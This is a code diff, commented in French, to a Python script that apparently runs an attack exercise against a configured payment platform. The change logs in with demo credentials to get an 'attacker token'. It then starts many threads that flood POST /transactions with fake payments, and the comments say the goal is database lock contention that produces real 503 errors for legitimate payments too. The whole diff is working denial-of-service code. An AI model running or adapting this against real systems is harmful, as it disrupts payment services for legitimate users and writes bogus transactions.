@@ -56,11 +56,32 @@ def _cible():
         return json.load(f)["plateforme"]["url"].rstrip("/")
 
 
-def _marteau(url: str) -> None:
+def _jeton(url: str):
+    """Jeton attaquant (creds de demo) pour pouvoir ecrire des paiements."""
+    import json
+    try:
+        data = json.dumps({"username": "demo", "password": "demo"}).encode()
+        req = urllib.request.Request(url + "/auth/token", data=data, method="POST",
+                                     headers={"Content-Type": "application/json"})
+        with urllib.request.urlopen(req, timeout=5) as r:
+            return json.load(r).get("access_token")
+    except (urllib.error.URLError, OSError, ValueError):
+        return None
 
+
+def _marteau(url: str, jeton=None) -> None:
+    # Saturer les PAIEMENTS : ecritures concurrentes sur /transactions -> contention reelle
+    # (SQLite se verrouille) -> de vrais 503 pour les paiements legitimes aussi.
+    import json
+    corps = json.dumps({"amount_cents": 1250, "currency": "EUR",
+                        "payer": "attaque", "payee": "caisse"}).encode()
+    headers = {"Content-Type": "application/json"}
+    if jeton:
+        headers["Authorization"] = "Bearer " + jeton
     while not _arret.is_set():
         try:
-            with urllib.request.urlopen(url + "/health", timeout=5) as r:
+            req = urllib.request.Request(url + "/transactions", data=corps, method="POST", headers=headers)
+            with urllib.request.urlopen(req, timeout=5) as r:
                 r.read()
             with _verrou:
                 _compteur["envoyees"] += 1
@@ -93,9 +114,11 @@ def lancer(niveau: int, nom: str, n_fils: int | None = None) -> int:
         return 1
     ref_ms = int((time.time() - t0) * 1000)
     print("[REEL] latence de reference /health : %d ms" % ref_ms, flush=True)
-    print("[REEL] %d fils de charge sur /health, %d s" % (actifs, DUREE_S), flush=True)
+    jeton = _jeton(url)
+    print("[REEL] %d fils d'ecriture sur /transactions, %d s%s" % (
+        actifs, DUREE_S, "" if jeton else " (sans jeton : 401 attendus)"), flush=True)
 
-    fils = [threading.Thread(target=_marteau, args=(url,), daemon=True) for _ in range(actifs)]
+    fils = [threading.Thread(target=_marteau, args=(url, jeton), daemon=True) for _ in range(actifs)]
     for f in fils:
         f.start()
     debut = time.time()
